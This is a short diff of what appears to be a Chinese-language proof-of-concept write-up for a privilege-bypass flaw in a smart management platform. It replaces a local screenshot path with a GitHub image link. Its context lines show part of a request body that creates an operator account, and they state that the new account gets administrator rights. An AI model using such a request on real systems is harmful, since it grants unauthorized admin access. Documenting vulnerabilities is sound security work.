@@ -30,4 +30,5 @@ operatorName=test123456&operatorPwd=123456&operpassword=123456&operatorRole=00&v
 
 成功创建账号，登陆后台可以看到自己创建的账号拥有管理员权限
 
-![image-20240615204600624](D:\py\POC\一脸通智慧管理平台权限绕过漏洞\image-20240615204600624.png)
+![image](https://github.com/hardog123/poc-exp/assets/170905460/a68b9e83-6e96-4449-a315-c0fc2cb629de)
+
